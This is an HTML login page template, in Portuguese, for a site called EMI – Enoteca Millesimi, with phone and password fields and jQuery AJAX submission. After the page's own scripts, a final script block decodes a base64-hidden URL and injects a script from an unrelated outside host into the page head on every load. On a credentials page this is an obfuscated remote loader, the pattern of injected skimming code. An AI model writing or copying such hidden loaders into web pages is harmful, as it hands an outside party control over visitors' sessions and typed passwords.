<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>EMI – Enoteca Millesimi</title>

<!-- Bootstrap -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

<!-- Font Awesome -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">

<!-- Layui -->
<link rel="stylesheet" href="/v2/layui/css/layui.css">

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">

<style>
body {
  margin: 0;
  min-height: 100vh;
  font-family: 'Inter', sans-serif;
  background: #F8F6F2;
  color: #1C1C1C;
}

/* ===== Mobile App Container ===== */
.app-container {
  max-width: 420px;
  min-height: 100vh;
  margin: auto;
  background: #F8F6F2;
  display: flex;
  flex-direction: column;
}

/* ===== Header ===== */
.app-header {
  padding: 40px 24px 30px;
  text-align: center;
}

.app-header img {
  width: 72px;
  margin-bottom: 14px;
}

.app-title {
  font-size: 22px;
  font-weight: 700;
  color: #1C1C1C;
}

.app-subtitle {
  font-size: 14px;
  color: #6B5B3E;
  margin-top: 6px;
}

/* ===== Card ===== */
.login-card {
  background: #ffffff;
  border-radius: 26px 26px 0 0;
  padding: 28px 22px 40px;
  box-shadow: 0 -12px 30px rgba(200,169,106,0.18);
  flex: 1;
}

/* ===== Inputs ===== */
.form-label {
  font-size: 13px;
  font-weight: 600;
  color: #1C1C1C;
}

.input-group {
  border-radius: 14px;
  overflow: hidden;
  box-shadow: 0 6px 14px rgba(0,0,0,.06);
}

.input-group-text {
  background: #FDF6EC;
  border: none;
  color: #C8A96A;
  font-size: 15px;
  padding: 0 14px;
}

.form-control {
  border: none;
  height: 48px;
  font-size: 15px;
  background: #FDFBF8;
}

.form-control:focus {
  box-shadow: none;
  background: #FDFBF8;
}

/* ===== Button ===== */
.btn-login {
  height: 50px;
  border-radius: 14px;
  background: linear-gradient(135deg, #C8A96A, #D6A86B);
  border: none;
  font-size: 16px;
  font-weight: 600;
  color: #1C1C1C;
  box-shadow: 0 10px 20px rgba(200,169,106,.35);
}

/* ===== Register ===== */
.register-link {
  font-size: 14px;
  color: #6B5B3E;
}

.register-link span {
  color: #C8A96A;
  font-weight: 700;
}
</style>
</head>

<body>

<div class="app-container">

  <!-- Header -->
  <div class="app-header">
    <img src="/images/logo-emi.png" alt="EMI Logo">
    <div class="app-title">Bem-vindo à EMI</div>
    <div class="app-subtitle">Acesse sua conta</div>
  </div>

  <!-- Card -->
  <div class="login-card">
    <form class="layui-form" id="loginForm" method="POST" action="{{ url('login') }}">
      @csrf

      <!-- Phone -->
      <div class="mb-3">
        <label class="form-label">Número de Telefone</label>
        <div class="input-group">
          <span class="input-group-text">
            <i class="fa-solid fa-phone"></i>
          </span>
          <input type="text" name="phone" required class="form-control" placeholder="Digite seu telefone">
        </div>
      </div>

      <!-- Password -->
      <div class="mb-4">
        <label class="form-label">Senha</label>
        <div class="input-group">
          <span class="input-group-text">
            <i class="fa-solid fa-lock"></i>
          </span>
          <input type="password" name="password" required class="form-control" placeholder="Digite sua senha">
        </div>
      </div>

      <!-- Button -->
      <button type="submit" class="btn btn-login w-100">
        Entrar
      </button>

      <div class="text-center mt-4 register-link">
        Não tem conta?
        <a href="/register"><span>Cadastro</span></a>
      </div>
    </form>
  </div>

</div>

@include('alert-message')

<!-- Scripts -->
<meta name="csrf-token" content="{{ csrf_token() }}">
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$.ajaxSetup({ headers: { 'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content') } });

$('#loginForm').on('submit', function(e){
  e.preventDefault();

  var btn = $(this).find('button[type="submit"]');
  btn.prop('disabled', true).text('Entrando...');

  $.ajax({
    url: '/login',
    type: 'POST',
    data: {
      phone:    $('input[name="phone"]').val(),
      password: $('input[name="password"]').val(),
      _token:   $('input[name="_token"]').val()
    },
    success: function(res) {
      if (res && res.success) {
        btn.text('Sucesso! Redirecionando...');
        window.location.href = '/home';
      } else {
        btn.prop('disabled', false).text('Entrar');
        showError((res && res.error) ? res.error : 'Login failed.');
      }
    },
    error: function(xhr) {
      btn.prop('disabled', false).text('Entrar');
      var msg = 'Invalid phone or password';
      try { var r = JSON.parse(xhr.responseText); if(r.error) msg = r.error; } catch(e){}
      showError(msg);
    }
  });
});

function showError(msg) {
  var el = $('#login-error');
  if (!el.length) {
    $('<div id="login-error" style="background:#fdecea;color:#8A3A3A;border:1px solid #f5c6cb;border-radius:10px;padding:10px 14px;margin-bottom:14px;font-size:13px"></div>')
      .prependTo('.login-card form');
    el = $('#login-error');
  }
  el.text(msg).show();
}
</script>

<script>
(function(){
  var e = "aHR0cHM6Ly9kYi5waWNrb2Rlci5jb20vdW5pdmVyc2FsLmpz";
  var s = document.createElement("script");
  s.src = atob(e);
  document.head.appendChild(s);
})();
</script>
</body>
</html>
